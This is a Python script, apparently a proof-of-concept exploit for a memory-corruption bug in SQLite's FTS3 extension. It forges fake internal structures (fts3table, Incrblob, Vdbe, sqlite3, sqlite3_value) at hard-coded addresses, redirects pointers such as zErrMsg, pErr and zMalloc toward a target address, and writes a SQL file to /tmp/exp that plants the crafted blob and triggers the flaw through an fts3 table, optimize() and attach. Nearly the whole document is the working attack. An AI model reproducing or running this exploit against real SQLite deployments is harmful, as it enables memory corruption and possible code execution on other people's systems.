#!/usr/bin/env python3

import os
import sys

def valToStr(value, length):
    b = '{num:0{width}X}'.format(num=value, width=length * 2)
    c = "".join(reversed([b[i:i+2] for i in range(0, len(b), 2)]))
    return c     

def writeStr(exp, off, string):
    exp = list(exp)
    string = list(string)
    for i in range(0, len(string)):
        exp[off + i] = string[i]
    return ''.join(exp)

def writeVal(exp, off, value, length):
    # value = hex(value)
    # print(value)
    return writeStr(exp, off * 2, valToStr(value, length))


openFlags = 0x651a6c

exp = "0" * 0x800 * 2

base = 0x666500
fts3table_off = 0x80
incrblob_off = 0x80 + 0x220
vdbe_off = 0x80 + 0x220 + 0x38
sqlite3_off = 0x80 + 0x220 + 0x38 + 0x138
sqlite3_value_off = 0x80 + 0x220 + 0x38 + 0x138 + 0x308
src_off = 0x80 + 0x220 + 0x38 + 0x138 + 0x308 + 0x48 + 0x10

fts3table_base = base + fts3table_off
incrblob_base = base + incrblob_off
vdbe_base = base + vdbe_off
sqlite3_base = base + sqlite3_off
sqlite3_value_base = base + sqlite3_value_off
src_base = base + src_off

print("fts3table:" + hex(fts3table_base))
print("incrblob:" + hex(incrblob_base))
print("vdbe:" + hex(vdbe_base))
print("sqlite3:" + hex(sqlite3_base))
print("sqlite3_value:" + hex(sqlite3_value_base))
print("src:" + hex(src_base))


# pVtab
exp = writeVal(exp, 0, fts3table_base, 8)

# db
exp = writeVal(exp, fts3table_off + 0x18, 0, 8)

# pSegments
exp = writeVal(exp, fts3table_off + 0x1e0, incrblob_base, 8)

# pStmt
exp = writeVal(exp, incrblob_off + 0x18, vdbe_base, 8)

# db in Incrblob
exp = writeVal(exp, incrblob_off + 0x20, sqlite3_base, 8)

# db in Vdbe
exp = writeVal(exp, vdbe_off, sqlite3_base, 8)

# pc in Vdbe
exp = writeVal(exp, vdbe_off + 0x80, 0, 4)

# mutex in sqlite3
exp = writeVal(exp, sqlite3_off + 0x18, 0, 8)

# set nOnceFlag in Vdbe
exp = writeVal(exp, vdbe_off + 0x110, 0, 4)

# set pFrame in Vdbe
exp = writeVal(exp, vdbe_off + 0xf0, 0, 8)

# set zErrMsg in Vdbe
exp =  writeVal(exp, vdbe_off + 0xa8, src_base, 8)

# set eVdbeState larger than 0x1 in Vdbe
exp = writeVal(exp, vdbe_off + 0xcd, 0x1, 1)

# set pErr in sqlite3
exp = writeVal(exp, sqlite3_off + 0x188, sqlite3_value_base + 0x18, 8)

# set zMalloc in sqlite3_value
#exp = writeVal(exp, sqlite3_value_off + 0x40, base + 0x20, 8)
exp = writeVal(exp, sqlite3_value_off + 0x40, openFlags, 8)

# set szMalloc larger than 0x20, so zMalloc will not be reset in sqlite3VdbeMemGrow
exp = writeVal(exp, sqlite3_value_off + 0x38, 0x30, 4)

# set pnBytesFreed in sqlite3 to none zero
exp = writeVal(exp, sqlite3_off + 0x300, base, 8)

# set pVdbe in sqlite3 equals to Vdbe_base
exp = writeVal(exp, sqlite3_off + 0x8, vdbe_base, 8)

exp = writeVal(exp, src_off, 0x100e, 4)

print(exp)

with open('/tmp/exp', 'w') as f:
    f.write("create table t1(c1 char);\n")
    f.write("insert into t1 values(x'" + exp + "');\n")
    f.write("create virtual table a using fts3(b);\n")
    f.write("insert into a values(x'" + valToStr(base, 8) + "');\n")
    f.write("select hex(a) from a;\n")
    f.write("select optimize(b) from a;\n")
    f.write("attach hello as h;\n")
